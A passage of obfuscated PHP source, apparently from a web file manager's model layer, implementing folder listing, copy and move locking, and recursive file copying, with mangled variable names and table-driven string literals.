$GLOBALS[$ïí×ïƒè[16]][$ïí×ïƒè[101]][$ïí×ïƒè[587]]; if ($¯¨â°ùÔ[$ïí×ïƒè[518]][$ïí×ïƒè[588]] <= time() - $˜øªÅÊœ) { $this->metaSet($¯¨â°ùÔ[$ïí×ïƒè[193]], $ïí×ïƒè[586], null); $this->metaSet($¯¨â°ùÔ[$ïí×ïƒè[193]], $ïí×ïƒè[588], null); unset($¯¨â°ùÔ[$ïí×ïƒè[518]][$ïí×ïƒè[586]]); continue; } $æÒ‡ú£— = $¯¨â°ùÔ[$ïí×ïƒè[518]][$ïí×ïƒè[586]]; $¯¨â°ùÔ[$ïí×ïƒè[518]][$ïí×ïƒè[589]] = Model($ïí×ïƒè[578])->getInfoSimpleOuter($æÒ‡ú£—); } } unset($¯¨â°ùÔ); } public function parentLevelArray($¹¾ˆûŒ‚) { $ì²™Üè¹ =& $_SERVER[•€áå–Õ]; $¹¾ˆûŒ‚ = explode($ì²™Üè¹[60], trim($¹¾ˆûŒ‚, $ì²™Üè¹[60])); return array_remove_value($¹¾ˆûŒ‚, $ì²™Üè¹[224]); } public function listAll($›Ğ±¡î‘) { $³¨‹ô„È =& $_SERVER[•€áå–Õ]; $È€°Ÿëõ = $this->sourceInfo($›Ğ±¡î‘); $äæİÔğ¡ = array($³¨‹ô„È[590] => array($³¨‹ô„È[591], $È€°Ÿëõ[$³¨‹ô„È[564]] . $›Ğ±¡î‘ . $³¨‹ô„È[592]), $³¨‹ô„È[593] => 0); $î¤ÜÊ€Á = $³¨‹ô„È[594]; $•­üò¬ã = "\114\x45\x46\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\x65\40\146\x69\154\x65\40\x6f\x6e\x20\x73\157\165\162\143\x65\56\146\151\x6c\145\x49\x44\40\75\x20\146\x69\x6c\145\x2e\146\151\154\x65\111\x44"; $Ë‚²Ÿ¯ƒ = $this->alias($³¨‹ô„È[498])->field($î¤ÜÊ€Á)->where($äæİÔğ¡)->join($•­üò¬ã)->select(); $this->_listAppendAuth($Ë‚²Ÿ¯ƒ); $this->_listAppendUser($Ë‚²Ÿ¯ƒ); $this->_listAppendPath($Ë‚²Ÿ¯ƒ); $Ë‚²Ÿ¯ƒ = array_to_keyvalue($Ë‚²Ÿ¯ƒ, $³¨‹ô„È[193]); $¼¿¡„§° = "\57{$È€°Ÿëõ[$³¨‹ô„È[42]]}\57"; $¼¿¡„§° = $¼¿¡„§° == $³¨‹ô„È[572] ? $³¨‹ô„È[18] : $¼¿¡„§°; $–íÈÍü = array(); foreach ($Ë‚²Ÿ¯ƒ as $ƒÜş…›ö => $¿ó”¥Ë©) { $“òıúĞÔ = $this->parentLevelArray($¿ó”¥Ë©[$³¨‹ô„È[564]]); array_shift($“òıúĞÔ); $ÔÍÀ©Î = $¼¿¡„§°; for ($§ò·½Ø = 0; $§ò·½Ø < count($“òıúĞÔ); $§ò·½Ø++) { $ÔÍÀ©Î .= $Ë‚²Ÿ¯ƒ[$“òıúĞÔ[$§ò·½Ø]][$³¨‹ô„È[42]] . $³¨‹ô„È[18]; } $ÔÍÀ©Î .= $¿ó”¥Ë©[$³¨‹ô„È[42]]; if ($¿ó”¥Ë©[$³¨‹ô„È[464]]) { $ÔÍÀ©Î .= $³¨‹ô„È[18]; } $ ş¢í•ğ = array($³¨‹ô„È[474] => str_replace($³¨‹ô„È[572], $³¨‹ô„È[18], str_replace($³¨‹ô„È[572], $³¨‹ô„È[18], str_replace($³¨‹ô„È[572], $³¨‹ô„È[18], $ÔÍÀ©Î))), $³¨‹ô„È[595] => intval($¿ó”¥Ë©[$³¨‹ô„È[464]]), $³¨‹ô„È[596] => intval($¿ó”¥Ë©[$³¨‹ô„È[88]]), $³¨‹ô„È[97] => intval($¿ó”¥Ë©[$³¨‹ô„È[97]]), $³¨‹ô„È[99] => $this->pathInfoFilter($¿ó”¥Ë©)); if (!$ ş¢í•ğ[$³¨‹ô„È[464]]) { $ ş¢í•ğ[$³¨‹ô„È[520]] = $¿ó”¥Ë©[$³¨‹ô„È[520]]; } $–íÈÍü[] = $ ş¢í•ğ; } $–íÈÍü = array_sort_by($–íÈÍü, $³¨‹ô„È[96]); return $–íÈÍü; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Âµ¬—®Ó) { $è½­œ×¨ =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($è½­œ×¨[597], $Âµ¬—®Ó); $–¯èãù† = 1; $this->_lockEvent($Âµ¬—®Ó, array($è½­œ×¨[598], $è½­œ×¨[599]), $–¯èãù†); $this->_lockParent($Âµ¬—®Ó, array($è½­œ×¨[599]), $–¯èãù†); $this->_lockEvent($Âµ¬—®Ó, array($è½­œ×¨[600], $è½­œ×¨[601]), $–¯èãù†); $this->_lockCheckEnd($è½­œ×¨[597], $Âµ¬—®Ó); } public function lockCopyEnd($ü¦Æ¹ÙÖ) { $öÆÀúúÆ =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $„Ğğ‘É… = 0; $this->_lockEvent($ü¦Æ¹ÙÖ, array($öÆÀúúÆ[598], $öÆÀúúÆ[599]), $„Ğğ‘É…); $this->_lockParent($ü¦Æ¹ÙÖ, array($öÆÀúúÆ[599]), $„Ğğ‘É…); $this->_lockEvent($ü¦Æ¹ÙÖ, array($öÆÀúúÆ[600], $öÆÀúúÆ[601]), $„Ğğ‘É…); } public function lockWriteStart($¢‘´âå, $òàÀñ½ = '') { $Ë„ìƒ• =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ë„ìƒ•[598], $¢‘´âå); $¢¸®İùµ = 1; $this->_lockKey($Ë„ìƒ•[602] . $¢‘´âå . $Ë„ìƒ•[20] . $òàÀñ½, $¢¸®İùµ); $this->_lockEvent($¢‘´âå, array($Ë„ìƒ•[597], $Ë„ìƒ•[599]), $¢¸®İùµ); $this->_lockParent($¢‘´âå, array($Ë„ìƒ•[597], $Ë„ìƒ•[599]), $¢¸®İùµ); $this->_lockCheckEnd($Ë„ìƒ•[598], $¢‘´âå); } public function lockWriteEnd($ÈÎ¹î«Ğ, $ÙŠ¿ƒÜ¬ = '') { $·ŠË¸ =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $Ö‹—Òïâ = 0; $this->_lockKey($·ŠË¸[602] . $ÈÎ¹î«Ğ . $·ŠË¸[20] . $ÙŠ¿ƒÜ¬, $Ö‹—Òïâ); $this->_lockEvent($ÈÎ¹î«Ğ, array($·ŠË¸[597], $·ŠË¸[599]), $Ö‹—Òïâ); $this->_lockParent($ÈÎ¹î«Ğ, array($·ŠË¸[597], $·ŠË¸[599]), $Ö‹—Òïâ); } public function lockMoveStart($ë†Ã¯¤ß) { $‹ÁÄ‰’ï =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‹ÁÄ‰’ï[599], $ë†Ã¯¤ß); $²Á—Ğ…Å = 1; $this->_lockKey($‹ÁÄ‰’ï[603] . $ë†Ã¯¤ß, $²Á—Ğ…Å); $this->_lockEvent($ë†Ã¯¤ß, array($‹ÁÄ‰’ï[597], $‹ÁÄ‰’ï[598]), $²Á—Ğ…Å); $this->_lockParent($ë†Ã¯¤ß, array($‹ÁÄ‰’ï[597], $‹ÁÄ‰’ï[599]), $²Á—Ğ…Å); $this->_lockEvent($ë†Ã¯¤ß, array($‹ÁÄ‰’ï[604], $‹ÁÄ‰’ï[600], $‹ÁÄ‰’ï[601]), $²Á—Ğ…Å); $this->_lockCheckEnd($‹ÁÄ‰’ï[599], $ë†Ã¯¤ß); } public function lockMoveEnd($“ªİ†ãß) { $’ÒãÕÈ =& $_SERVER[•€áå–Õ]; if (!$this->allowLock()) { return; } $æ×àşŞë = 0; $this->_lockKey($’ÒãÕÈ[603] . $“ªİ†ãß, $æ×àşŞë); $this->_lockEvent($“ªİ†ãß, array($’ÒãÕÈ[597], $’ÒãÕÈ[598]), $æ×àşŞë); $this->_lockParent($“ªİ†ãß, array($’ÒãÕÈ[597], $’ÒãÕÈ[599]), $æ×àşŞë); $this->_lockEvent($“ªİ†ãß, array($’ÒãÕÈ[604], $’ÒãÕÈ[600], $’ÒãÕÈ[601]), $æ×àşŞë); } private function _lockCheck($…Ü¿İ, $å¤¬Äí–) { $Ê¹Âş‚ =& $_SERVER[•€áå–Õ]; $è•ŞŞ’ş = $this->sourceInfo($å¤¬Äí–); $«Á¤…ê = $…Ü¿İ . $Ê¹Âş‚[20] . $å¤¬Äí–; $this->_lockTimeStart[$«Á¤…ê] = timeFloat(); if (!is_array($è•ŞŞ’ş)) { return; } $ªïëÒ¼é = LNG($Ê¹Âş‚[605]); CacheLock::setErrorMsg($Ê¹Âş‚[175] . htmlspecialchars($è•ŞŞ’ş[$Ê¹Âş‚[42]]) . $Ê¹Âş‚[177] . $ªïëÒ¼é); $this->_lockKey($«Á¤…ê, 1); $this->_lockKey($«Á¤…ê, 0); $Ï¥ş†° = array_reverse($this->parentLevelArray($è•ŞŞ’ş[$Ê¹Âş‚[564]])); foreach ($Ï¥ş†° as $£¤ ®) { $«Á¤…ê = $…Ü¿İ . $Ê¹Âş‚[606] . $£¤ ®; if (CacheLock::lockGet($Ê¹Âş‚[607] . $«Á¤…ê)) { $è•ŞŞ’ş = $this->sourceInfo($£¤ ®); CacheLock::setErrorMsg($Ê¹Âş‚[175] . htmlspecialchars($è•ŞŞ’ş[$Ê¹Âş‚[42]]) . $Ê¹Âş‚[177] . $ªïëÒ¼é); $this->_lockKey($«Á¤…ê, 1); $this->_lockKey($«Á¤…ê, 0); } } } private function _lockCheckEnd($§ªËÄÅ, $îŸ‚”»Ò) { $…·µå½Ì =& $_SERVER[•€áå–Õ]; $¦Şİ£íË = $§ªËÄÅ . $…·µå½Ì[20] . $îŸ‚”»Ò; CacheLock::setErrorMsg($…·µå½Ì[433]); if (!isset($this->_lockTimeStart[$¦Şİ£íË])) { return; } $İîà¯ùÎ = timeFloat() - $this->_lockTimeStart[$¦Şİ£íË]; unset($this->_lockTimeStart[$¦Şİ£íË]); if ($İîà¯ùÎ > 0.5) { unset(self::$cacheSourceInfo[$…·µå½Ì[512] . $îŸ‚”»Ò]); } $§•Ì™–° = $this->sourceInfo($îŸ‚”»Ò); if (!$§•Ì™–°) { show_json(LNG($…·µå½Ì[117]), !1); } } private function _lockParent($©Ç‘òæˆ, $¯Õñô, $‹çÒŞºœ) { if (!$this->autoLockSet) { return; } $·Û÷Š¹ = $this->sourceInfo($©Ç‘òæˆ); if (!is_array($·Û÷Š¹)) { return; } $óæÔÀ = array_reverse($this->parentLevelArray($·Û÷Š¹[$_SERVER[•€áå–Õ][564]])); foreach ($óæÔÀ as $À¦öüÊµ) { $this->_lockEvent($À¦öüÊµ, $¯Õñô, $‹çÒŞºœ); } } private function _lockEvent($Úœ÷şç•, $¡Ù²˜Ã, $Ã§éö¶¼) { $ÛøüƒÆ´ =& $_SERVER[•€áå–Õ]; if (!$this->autoLockSet) { return; } foreach ($¡Ù²˜Ã as $¿£µû¿®) { $“·¬ø± = $¿£µû¿® . $ÛøüƒÆ´[20] . $Úœ÷şç•; if ($Ã§éö¶¼ && CacheLock::lockGet($ÛøüƒÆ´[607] . $“·¬ø±)) { continue; } $this->_lockKey($“·¬ø±, $Ã§éö¶¼); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ ®Á¬‡İ, $ˆÄµïÃÒ = 1) { $ÀÕé÷æ« = $_SERVER[•€áå–Õ][607] . md5($ ®Á¬‡İ); if ($ˆÄµïÃÒ) { if (isset(self::$_lockItemArr[$ÀÕé÷æ«])) { return; } self::$_lockItemArr[$ÀÕé÷æ«] = 1; CacheLock::lock($ÀÕé÷æ«, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÀÕé÷æ«])) { return; } unset(self::$_lockItemArr[$ÀÕé÷æ«]); CacheLock::unlock($ÀÕé÷æ«); } } public function isParentOf($ì®š­ğÚ, $ñíñ¾í) { $÷§ïã ï =& $_SERVER[•€áå–Õ]; $ÄúÀ™–ª = $this->sourceInfo($ì®š­ğÚ); $ÑÎ¡•Ç« = $this->sourceInfo($ñíñ¾í); $ş×¬Ûø¬ = $ÄúÀ™–ª[$÷§ïã ï[564]] . $ÄúÀ™–ª[$÷§ïã ï[193]] . $÷§ïã ï[60]; $âş§³Ò = $ÑÎ¡•Ç«[$÷§ïã ï[564]] . $ÑÎ¡•Ç«[$÷§ïã ï[193]] . $÷§ïã ï[60]; $‹©ğ‘å = strpos($âş§³Ò, $ş×¬Ûø¬) === 0; return $‹©ğ‘å; } private $targetIsDelete = 0; public function copy($¼àñİ»°, $ºğìôôò, $î‚×æùĞ = REPEAT_REPLACE, $Ş†‹Ã¥ = '') { $ıÑÔ¸ÄÑ =& $_SERVER[•€áå–Õ]; $‰Ï¨§®¨ = $this->sourceInfo($¼àñİ»°); $«Ùû¡ê¸ = $this->sourceInfo($ºğìôôò); if (!$‰Ï¨§®¨ || !$«Ùû¡ê¸ || $«Ùû¡ê¸[$ıÑÔ¸ÄÑ[464]] != $ıÑÔ¸ÄÑ[100]) { return !1; } if ($this->isParentOf($¼àñİ»°, $ºğìôôò)) { return !1; } $…ßîù· = $Ş†‹Ã¥ ? $Ş†‹Ã¥ : $‰Ï¨§®¨[$ıÑÔ¸ÄÑ[42]]; $this->lockCopyStart($¼àñİ»°); $this->lockWriteStart($ºğìôôò, $…ßîù·); $­Ç»Ë²ô = array($ıÑÔ¸ÄÑ[608] => array(), $ıÑÔ¸ÄÑ[609] => array(), $ıÑÔ¸ÄÑ[610] => array()); $this->targetIsDelete = intval($‰Ï¨§®¨[$ıÑÔ¸ÄÑ[484]]); $˜üüÃ¹” = $this->fileNameExistAuto($ºğìôôò, $‰Ï¨§®¨); $À ûƒÇ… = $this->_copy($¼àñİ»°, $ºğìôôò, $î‚×æùĞ, $­Ç»Ë²ô, !0, $Ş†‹Ã¥); $this->_childrenListClear(); $this->lockCopyEnd($¼àñİ»°); $this->lockWriteEnd($ºğìôôò, $…ßîù·); if ($‰Ï¨§®¨[$ıÑÔ¸ÄÑ[464]] == $ıÑÔ¸ÄÑ[100] && $˜üüÃ¹” == $À ûƒÇ…) { $this->folderSizeResetChildren($˜üüÃ¹”); } Model($ıÑÔ¸ÄÑ[611])->addAll($­Ç»Ë²ô[$ıÑÔ¸ÄÑ[609]], array(), !0); if ($˜üüÃ¹” != $À ûƒÇ… || $‰Ï¨§®¨[$ıÑÔ¸ÄÑ[464]] == $ıÑÔ¸ÄÑ[100]) { Model($ıÑÔ¸ÄÑ[612])->eventCopy($À ûƒÇ…); } $this->saveAll($­Ç»Ë²ô[$ıÑÔ¸ÄÑ[610]]); Model($ıÑÔ¸ÄÑ[226])->linkAdd($­Ç»Ë²ô[$ıÑÔ¸ÄÑ[608]]); $this->folderSizeReset($ºğìôôò); $this->updateModifyTime($ºğìôôò); return $À ûƒÇ…; } private function _copy($Şª£×Å, $üøŠ¤Â÷, $àòÁŠÊÏ, &$ûšÉ±ñ», $Øìëú†, $ªö÷À»» = '') { $„¶÷ƒ²Õ =& $_SERVER[•€áå–Õ]; $÷ÀœöÚí = $this->sourceInfoCache($Şª£×Å); $–À¢ëèÕ = $÷ÀœöÚí[$„¶÷ƒ²Õ[464]] == $„¶÷ƒ²Õ[100]; $åæÅİ™÷ = $ªö÷À»» ? $ªö÷À»» : $÷ÀœöÚí[$„¶÷ƒ²Õ[42]]; $“Éñ°ãö = $this->fileNameExistAuto($üøŠ¤Â÷, $÷ÀœöÚí); if ($Øìëú†) { $this->_childrenAllMake($Şª£×Å); if ($–À¢ëèÕ && $“Éñ°ãö) { $this->_childrenAllMake($“Éñ°ãö); } } if (!$“Éñ°ãö) { return $this->_copyCreate($Şª£×Å, $üøŠ¤Â÷, $åæÅİ™÷, $ûšÉ±ñ»); } $ş‡ã±ó¾ = $“Éñ°ãö; if ($–À¢ëèÕ) { if ($àòÁŠÊÏ == REPEAT_RENAME_FOLDER) { $åæÅİ™÷ = $this->fileNameAutoCache($üøŠ¤Â÷, $åæÅİ™÷, $àòÁŠÊÏ, $–À¢ëèÕ); $ş‡ã±ó¾ = $this->_copyCreate($Şª£×Å, $üøŠ¤Â÷, $åæÅİ™÷, $ûšÉ±ñ»); } else { $ØµîßÏ = $this->_childrenList($Şª£×Å); foreach ($ØµîßÏ as $¦Ó‘´ùŞ) { $this->_copy($¦Ó‘´ùŞ[$„¶÷ƒ²Õ[193]], $“Éñ°ãö, $àòÁŠÊÏ, $ûšÉ±ñ», !1); } } } else { if ($àòÁŠÊÏ == REPEAT_RENAME || $àòÁŠÊÏ == REPEAT_RENAME_FOLDER) { $åæÅİ™÷ = $this->fileNameAutoCache($üøŠ¤Â÷, $åæÅİ™÷, $àòÁŠÊÏ, $–À¢ëèÕ); $ş‡ã±ó¾ = $this->_copyCreate($Şª£×Å, $üøŠ¤Â÷, $åæÅİ™÷, $ûšÉ±ñ»); } else { if ($àòÁŠÊÏ == REPEAT_REPLACE) { $·„§¾’ = $this->sourceInfoCache($“Éñ°ãö); $ØŞã¬À½ = $this->fileHistory($·„§¾’, $÷ÀœöÚí[$„¶÷ƒ²Õ[520]], $÷ÀœöÚí[$„¶÷ƒ²Õ[88]]); if ($ØŞã¬À½) { $ûšÉ±ñ»[$„¶÷ƒ²Õ[608]][] = $÷ÀœöÚí[$„¶÷ƒ²Õ[520]]; } } else { if ($àòÁŠÊÏ == REPEAT_SKIP) { } } } Hook::trigger($„¶÷ƒ²Õ[613], array($„¶÷ƒ²Õ[614], $÷ÀœöÚí, 0)); } return $ş‡ã±ó¾; } private function _copyCreate($ûº—ÈÉŒ, $¡ğıı€, $Í­ËÂÎ†, &$ ç©Øßæ) { $¼¸¾º‹µ =& $_SERVER[•€áå–Õ]; $¡Ø²ÅÏ€ = $this->sourceInfoCache($ûº—ÈÉŒ); $Ó®èŸ¿ñ = $this->sourceInfoCache($¡ğıı€); $›”ùïñº = $this->_makeItemData($¡Ø²ÅÏ€, $Ó®èŸ¿ñ, $Í­ËÂÎ†); Hook::trigger($¼¸¾º‹µ[615], $›”ùïñº); Hook::trigger($¼¸¾º‹µ[616], array($¼¸¾º‹µ[617], $›”ùïñº, 0)); $¿ˆìûÎ„ = $this->add($›”ùïñº); $‹´Õñ§‰ = array($¼¸¾º‹µ[193] => $¿ˆìûÎ„, $¼¸¾º‹µ[42] => $Í­ËÂÎ†); $this->_copyApplyMeta($‹´Õñ§‰, $ ç©Øßæ); if ($¡Ø²ÅÏ€[$¼¸¾º‹µ[464]] != $¼¸¾º‹µ[100]) { $ ç©Øßæ[$¼¸¾º‹µ[608]][] = $¡Ø²ÅÏ€[$¼¸¾º‹µ[520]]; return $¿ˆìûÎ„; } $º°ğ³ıŠ = array(); $£¥»¼Úæ = array(); $this->_childrenListAll($ûº—ÈÉŒ, $º°ğ³ıŠ); $ÓìÉášˆ = count($º°ğ³ıŠ); if ($ÓìÉášˆ == 0) { return $¿ˆìûÎ„; } $£ë½¸æ® = $this->sourceInfo($¿ˆìûÎ„); foreach ($º°ğ³ıŠ as $İõÛ‰µÈ) { $ç„°Ú’ = $this->_makeItemData($İõÛ‰µÈ, $£ë½¸æ®, $İõÛ‰µÈ[$¼¸¾º‹µ[42]]); $ç„°Ú’[$¼¸¾º‹µ[564]] = $İõÛ‰µÈ[$¼¸¾º‹µ[564]]; $£¥»¼Úæ[] = $ç„°Ú’; } $this->chunkEventSet($¼¸¾º‹µ[618], array($¼¸¾º‹µ[619], $›”ùïñº, $ÓìÉášˆ)); $this->addAll($£¥»¼Úæ, array(), !1); $…¼÷©¦Ÿ = $this->where(array($¼¸¾º‹µ[192] => $¿ˆìûÎ„))->select(); $¬ÁÔ³ûö = $this->_childrenMakeRelation($º°ğ³ıŠ, $…¼÷©¦Ÿ); $¬ÁÔ³ûö[$ûº—ÈÉŒ] = $¿ˆìûÎ„; $üÜ–ùÅ = array(); $Ø®¥šÅÒ = array(); foreach ($…¼÷©¦Ÿ as $İõÛ‰µÈ) { $¶±ÉÕš„ = $İõÛ‰µÈ[$¼¸¾º‹µ[193]]; $Æ„æ—ª© = $this->_childrenMatch($¬ÁÔ³ûö, $İõÛ‰µÈ, $£ë½¸æ®); $üÜ–ùÅ[] = array($¼¸¾º‹µ[193], $¶±ÉÕš„, $¼¸¾º‹µ[192], $Æ„æ—ª©[$¼¸¾º‹µ[192]]); $Ø®¥šÅÒ[] = array($¼¸¾º‹µ[193], $¶±ÉÕš„, $¼¸¾º‹µ[564], $Æ„æ—ª©[$¼¸¾º‹µ[564]]); $this->_copyApplyMeta($İõÛ‰µÈ, $ ç©Øßæ); if ($İõÛ‰µÈ[$¼¸¾º‹µ[464]] != $¼¸¾º‹µ[100]) { $ ç©Øßæ[$¼¸¾º‹µ[608]][] = $İõÛ‰µÈ[$¼¸¾º‹µ[520]]; } } $this->chunkEventSet($¼¸¾º‹µ[620], array($¼¸¾º‹µ[621], $›”ùïñº, $ÓìÉášˆ)); $this->saveAll($üÜ–ùÅ); $this->chunkEventSet($¼¸¾º‹µ[622], array($¼¸¾º‹µ[623], $›”ùïñº, $ÓìÉášˆ)); $this->saveAll($Ø®¥šÅÒ); return $¿ˆìûÎ„; } private function _childrenMakeRelation($øø÷Õ¾, $éª¢Ë¯î) { $ºĞš¥¢Ş =& $_SERVER[•€áå–Õ]; $×‰¾§ƒà = array(); $¸Éíº€Ø = array(); foreach ($øø÷Õ¾ as $‹³™Ìâ§) { $ÍíÊŒ‹¸ = $‹³™Ìâ§[$ºĞš¥¢Ş[42]] . $ºĞš¥¢Ş[18] . $‹³™Ìâ§[$ºĞš¥¢Ş[564]]; $×‰¾§ƒà[$ÍíÊŒ‹¸] = $‹³™Ìâ§[$ºĞš¥¢Ş[193]]; } foreach ($éª¢Ë¯î as $‹³™Ìâ§) { $ÍíÊŒ‹¸ = $‹³™Ìâ§[$ºĞš¥¢Ş[42]] . $ºĞš¥¢Ş[18] . $‹³™Ìâ§[$ºĞš¥¢Ş[564]]; $ö¡™ıäÇ = $×‰¾§ƒà[$ÍíÊŒ‹¸]; $¸Éíº€Ø[$ö¡™ıäÇ] = $‹³™Ìâ§[$ºĞš¥¢Ş[193]]; } return $¸Éíº€Ø; } private function _childrenMatch($š±œÛŠ”, $Ö“ç­½, $ê¤å“ÈŸ) { $îéë¢ûº =& $_SERVER[•€áå–Õ]; $³Ëóá¢¼ = $ê¤å“ÈŸ[$îéë¢ûº[564]]; $¸™êßƒ = $this->parentLevelArray($Ö“ç­½[$îéë¢ûº[564]]); foreach ($¸™êßƒ as $¯¥›šÊ¾) { if (isset($š±œÛŠ”[$¯¥›šÊ¾])) { $³Ëóá¢¼ .= $š±œÛŠ”[$¯¥›šÊ¾] . $îéë¢ûº[624]; } } $³Ëóá¢¼ = rtrim($³Ëóá¢¼, $îéë¢ûº[60]) . $îéë¢ûº[60]; $èşøº›Ø = $this->parentLevelArray($³Ëóá¢¼); $Îı¼ÉÉŒ = $èşøº›Ø[count($èşøº›Ø) - 1]; return array($îéë¢ûº[192] => $Îı¼ÉÉŒ, $îéë¢ûº[564] => $³Ëóá¢¼); } private function _makeItemData($Ö•Óñº‹, $ñ•¤¤‰, $ıÕ¬ó·Œ) { $¿‹Ú‹Ö =& $_SERVER[•€áå–Õ]; $¥ñ‚¤¸ö = array($¿‹Ú‹Ö[625] => $Ö•Óñº‹[$¿‹Ú‹Ö[464]], $¿‹Ú‹Ö[473] => $ıÕ¬ó·Œ, $¿‹Ú‹Ö[626] => $Ö•Óñº‹[$¿‹Ú‹Ö[465]] ? $Ö•Óñº‹[$¿‹Ú‹Ö[465]] : $¿‹Ú‹Ö[22], $¿‹Ú‹Ö[521] => $Ö•Óñº‹[$¿‹Ú‹Ö[520]] ? $Ö•Óñº‹[$¿‹Ú‹Ö[520]] : 0, $¿‹Ú‹Ö[596] => $Ö•Óñº‹[$¿‹Ú‹Ö[88]] ? $Ö•Óñº‹[$¿‹Ú‹Ö[88]] : 0, $¿‹Ú‹Ö[627] => intval($ñ•¤¤‰[$¿‹Ú‹Ö[190]]), $¿‹Ú‹Ö[628] => intval($ñ•¤¤‰[$¿‹Ú‹Ö[549]]), $¿‹Ú‹Ö[629] => intval(USER_ID), $¿‹Ú‹Ö[630] => intval(USER_ID), $¿‹Ú‹Ö[456] => intval($ñ•¤¤‰[$¿‹Ú‹Ö[193]]), $¿‹Ú‹Ö[631] => $ñ•¤¤‰[$¿‹Ú‹Ö[564]] . $ñ•¤¤‰[$¿‹Ú‹Ö[193]] . $¿‹Ú‹Ö[60], $¿‹Ú‹Ö[477] => $Ö•Óñº‹[$¿‹Ú‹Ö[97]] ? $Ö•Óñº‹[$¿‹Ú‹Ö[97]] : time(), $¿‹Ú‹Ö[483] => 0, $¿‹Ú‹Ö[632] => $¿‹Ú‹Ö[22]); return $¥ñ‚¤¸ö; } private function _copyApplyMeta($ÏÅ×†Á‡, &$½—±¹¨Ê) { $£Ğ ½Ü¡ =& $_SERVER[•€áå–Õ]; $Î›…í™â = $ÏÅ×†Á‡[$£Ğ ½Ü¡[193]]; $ÚÕ©Ôª­ = $ÏÅ×†Á‡[$£Ğ ½Ü¡[42]]; if (!isset($ÏÅ×†Á‡[$£Ğ ½Ü¡[633]]) || !$ÏÅ×†Á‡[$£Ğ ½Ü¡[633]] || $ÏÅ×†Á‡[$£Ğ ½Ü¡[633]] == $£Ğ ½Ü¡[224]) { $½—±¹¨Ê[$£Ğ ½Ü¡[610]][] = array($£Ğ ½Ü¡[193], $Î›…í™â, $£Ğ ½Ü¡[633], short_id($Î›…í™â)); } if (Input::check($ÚÕ©Ôª­, $£Ğ ½Ü¡[634])) { $½—±¹¨Ê[$£Ğ ½Ü¡[609]][] = array($£Ğ ½Ü¡[193] => $Î›…í™â, $£Ğ ½Ü¡[106] => $£Ğ ½Ü¡[517], $£Ğ ½Ü¡[429] => str_replace($£Ğ ½Ü¡[63], $£Ğ ½Ü¡[22], Pinyin::get($ÚÕ©Ôª­))); $½—±¹¨Ê[$£Ğ ½Ü¡[609]][] = array($£Ğ ½Ü¡[193] => $Î›…í™â, $£Ğ ½Ü¡[106] => $£Ğ ½Ü¡[516], $£Ğ ½Ü¡[429] => Pinyin::get($ÚÕ©Ôª­, $£Ğ ½Ü¡[635])); } $½—±¹¨Ê[$£Ğ ½Ü¡[609]][] = array($£Ğ ½Ü¡[193] => $Î›…í™â, $£Ğ ½Ü¡[106] => $£Ğ ½Ü¡[496], $£Ğ ½Ü¡[429] => KodSort::makeStr($ÚÕ©Ôª­)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ËØÎóó†) { $Á²×ªğı =& $_SERVER[•€áå–Õ]; $Î“ÔÁİ› = $this->sourceInfo($ËØÎóó†); $±¨õË»€ = $Á²×ªğı[636]; $Ïû“®š = array($Á²×ªğı[564] => array($Á²×ªğı[591], $Î“ÔÁİ›[$Á²×ªğı[564]] . $ËØÎóó† . $Á²×ªğı[592]), $Á²×ªğı[484] => $this->targetIsDelete); $Í®€È = $this->field($±¨õË»€)->where($Ïû“®š)->select(); if (!$Í®€È) { return; } $Í®€È = array_to_keyvalue($Í®€È, $Á²×ªğı[193]); foreach ($Í®€È as $Õ™¢é‚İ) { $Ÿ­µŒ¶ö = $Õ™¢é‚İ[$Á²×ªğı[192]]; $ËØÎóó† = $Õ™¢é‚İ[$Á²×ªğı[193]]; if (!isset($this->_childrenListCache[$ËØÎóó†]) && $Õ™¢é‚İ[$Á²×ªğı[464]] == $Á²×ªğı[100]) { $this->_childrenListCache[$ËØÎóó†] = array(); } if (!isset($this->_childrenListCache[$Ÿ­µŒ¶ö])) { $this->_childrenListCache[$Ÿ­µŒ¶ö] = array(); } $this->_childrenListCache[$Ÿ­µŒ¶ö][$ËØÎóó†] = $Õ™¢é‚İ; $this->_childrenItemCache[$ËØÎóó†] = $Õ™¢é‚İ; } } private function _childrenListAll($¦¥ºüˆ›, &$°Œ¹’¿å) { $éù¾å¬“ =& $_SERVER[•€áå–Õ]; if (!isset($this->_childrenListCache[$¦¥ºüˆ›])) { return; } $†ÆÑª = $this->_childrenListCache[$¦¥ºüˆ›]; foreach ($†ÆÑª as $¿úÒÚœñ => $å›œÎá¤) { $°Œ¹’¿å[$¿úÒÚœñ] = $å›œÎá¤; if ($å›œÎá¤[$éù¾å¬“[464]] == $éù¾å¬“[100]) { $this->_childrenListAll($¿úÒÚœñ, $°Œ¹’¿å); } } } private function sourceInfoCache($Ù€ØŞ) { if (isset($this->_childrenItemCache[$Ù€ØŞ])) { return $this->_childrenItemCache[$Ù€ØŞ]; } return $this->sourceInfo($Ù€ØŞ); } private function _childrenList($†œ°ö¿à) { if (isset($this->_childrenListCache[$†œ°ö¿à])) { return $this->_childrenListCache[$†œ°ö¿à]; } return $this->_childrenListSelect($†œ°ö¿à); } private function _childrenListSelect($Æùƒ«¼À) { $¬•éÕ =& $_SERVER[•€áå–Õ]; $¾ì¨ÃÊã = array($¬•éÕ[192] => $Æùƒ«¼À, $¬•éÕ[484] => $this->targetIsDelete); $àÁ²ÎÃ” = $this->where($¾ì¨ÃÊã)->select(); $àÁ²ÎÃ” = $àÁ²ÎÃ” ? $àÁ²ÎÃ” : array(); $Ğ¸ÛÇÛ‡ = array_to_keyvalue($àÁ²ÎÃ”, $¬•éÕ[193]); $this->_childrenListCache[$Æùƒ«¼À] = $Ğ¸ÛÇÛ‡; foreach ($Ğ¸ÛÇÛ‡ as $Æùƒ«¼À => $·¤úíŸ) { 